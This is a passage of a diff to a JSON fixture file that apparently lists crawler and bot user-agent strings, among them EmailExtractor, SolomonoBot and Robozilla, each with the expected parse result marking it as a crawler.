-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "NYXYS-KnowledgeFactory/1.0 (+governed; respects robots.txt)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "NYXYS-KnowledgeFactory",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; EmailExtractor/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "EmailExtractor",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; BragmantBot/1.0; +https://bragmant.com/bot)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "BragmantBot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; StackyEnrich/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "StackyEnrich",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; LeadFinder/2.0; +research)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "LeadFinder",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 datacomp-large-downloader/1.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "datacomp-large-downloader",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; GoogleAdsTxtChecker/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "GoogleAdsTxtChecker",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; Clearscopebot/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Clearscopebot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "hub-crawler-eino/0.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "hub-crawler-eino",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; GEO-Score-Validator/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "GEO-Score-Validator",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; Cartalys-Intel/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Cartalys-Intel",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; RankariaBot/1.0; +https://soogle.ai)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "RankariaBot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "CarniWa-PresenceResolver/1.0 (+https://carniwa.com)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "CarniWa-PresenceResolver",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "RivryBot/0.1-m0 (+https://rivry.ai; info@netzilicious.net)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "RivryBot",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "LiveDomainFinder/1.6.0 (+local research tool)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "LiveDomainFinder",
-      "modus": null,
-      "version": "1.6.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "capper-lead-research/0.1 (+compliance-review)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "capper-lead-research",
-      "modus": null,
-      "version": "0.1.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; enrichment-prefilter/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "enrichment-prefilter",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; tld-netprobe/1.0)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "tld-netprobe",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "DBD Bot/1.0 (+https://doond.com/bot)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "DBD Bot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; SeotrendsBot/1.0; +https://seotrends.pro)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "SeotrendsBot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "StackDetectorBot/1.0 (+)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "StackDetectorBot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "domainprintbot/1.0 (+https://domainprint.com)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "domainprintbot",
-      "modus": null,
-      "version": "1.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "ShopifyDomainScanner/2.0 (+dataset classification)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ShopifyDomainScanner",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "crawler",
-      "isbot": true,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HCP Analyzer/1.2.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "HCP Analyzer",
+      "name": "ATLBLbot",
       "modus": null,
       "version": "1.2.0",
       "manufacturer": "unknown",
@@ -3826,7 +2026,7 @@
   },
   {
     "headers": {
-      "user-agent": "hostio-bot/0.1 (+https://github.com/airyland/host.io; contact=i@mao.li)"
+      "user-agent": "Mozilla/4.04 (compatible; Dulance bot;  http://www.dulance.com/bot.jsp)"
     },
     "device": {
       "architecture": "",
@@ -3848,7 +2048,1177 @@
       "bits": 0
     },
     "client": {
-      "name": "hostio-bot",
+      "name": "Dulance Bot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; GoblioBot/0.6.3; +http://goblio.eu/bot.htm)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "GoblioBot",
+      "modus": null,
+      "version": "0.6.3",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; SolomonoBot/1.05; +http://www.solomono.ru)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "SolomonoBot",
+      "modus": null,
+      "version": "1.05.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; Gowikibot/1.0; +http://www.gowikibot.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Gowikibot",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Camcrawler (+http://www.camdiscover.com/crawler.html)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Camcrawler",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Marketing Grader Crawler 1.0 (http://marketing.grader.com/)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Marketing Grader",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "ElisaBot 1.0 unforgettable"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "ElisaBot",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "2ip.ru CMS Detector (http://2ip.ru/cms/)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "CMS detector",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Vortex/2.2 ( http://marty.anstey.ca/robots/vortex/)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Vortex",
+      "modus": null,
+      "version": "2.2.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Robozilla/1.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Robozilla",
+      "modus": null,
+      "version": "1.0.0",
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "roboobot/Nutch-1.0 (roboobot; http://wap.roboo.com; winter.pi@roboo.com)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "roboobot",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "crawler",
+      "isbot": true,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
